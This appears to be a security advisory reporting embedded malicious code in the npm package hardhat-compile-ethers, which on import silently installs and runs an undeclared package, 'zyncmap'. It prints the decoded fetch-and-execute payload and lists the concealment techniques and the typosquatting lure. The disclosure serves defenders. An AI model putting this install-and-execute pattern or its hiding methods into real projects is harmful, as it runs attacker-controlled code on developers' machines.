summary: Silent fetch-and-execute of undeclared 'zyncmap' package on module load
details: On require of hardhat-compile-ethers, dist/src/index.js spawns a detached Node child process whose command line and target package name are base64-encoded. The decoded payload runs `npm install zyncmap --no-save --silent --no-audit --no-fund` and then `require('zyncmap').getPlugin()()`. 'zyncmap' is not declared in package.json dependencies, so an arbitrary package controlled by whoever owns that name on the npm registry is fetched and executed in the consumer's project on import. Detached spawn, silenced stdio, windowsHide:true, empty try/catch wrappers, and base64 encoding of both the install command and the module name are used to hide the behavior from static review. The package name also mimics the legitimate @nomicfoundation/hardhat-ethers / @nomiclabs/hardhat-ethers plugins to lure developers searching for Hardhat ethers tooling.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
